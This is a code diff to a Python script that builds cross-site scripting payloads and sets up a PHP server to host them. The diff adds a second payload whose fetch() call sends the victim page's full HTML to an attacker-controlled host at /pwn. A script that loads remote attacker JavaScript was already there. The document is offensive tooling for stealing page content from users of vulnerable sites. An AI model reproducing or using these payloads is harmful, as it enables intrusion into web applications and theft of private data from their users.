@@ -18,13 +18,16 @@ Steps:
   1. Provide the IP address as a parameter, and the script will echo the payload.
   2. The payload will be:
      <script src="http://<IP>/script.js"></script>
+     <script>fetch('http://<IP>/pwn?html='+encodeURIComponent(document.documentElement.outerHTML))</script>
   3. The script will create a directory named 'web-server' and set up the PHP server.
     """)
 
 def create_web_server(ip):
     # Echo the payload instead of saving it to a file
     payload = f'<script src="http://{ip}/script.js"></script>'
-    print(f"Payload: {payload}")
+    print(f"Payload1: {payload}")
+    payl0ad = f"<script>fetch('http://{ip}/pwn?html='+encodeURIComponent(document.documentElement.outerHTML))</script>"
+    print(f"Payload2: {payl0ad}")
 
     # Create the 'web-server' directory
     os.makedirs("web-server", exist_ok=True)
